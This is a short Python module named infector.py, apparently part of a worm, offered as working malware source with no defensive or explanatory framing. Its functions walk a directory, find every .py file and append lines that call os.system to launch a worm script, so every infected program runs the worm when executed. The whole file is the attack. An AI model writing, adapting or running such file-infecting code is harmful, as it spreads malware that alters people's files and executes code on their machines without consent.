# infector.py - Module for infecting files on the local machine

import os
import shutil

def infect_files(directory):
    # Infect files in the specified directory
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.py'):
                file_path = os.path.join(root, file)
                infect_file(file_path)

def infect_file(file_path):
    # Infect a single Python file by appending the worm code
    with open(file_path, 'a') as f:
        f.write("\n# Injected by the worm\n")
        f.write("import os\n")
        f.write("os.system('python3 /path/to/worm.py')\n")
    print(f"Infected file: {file_path}")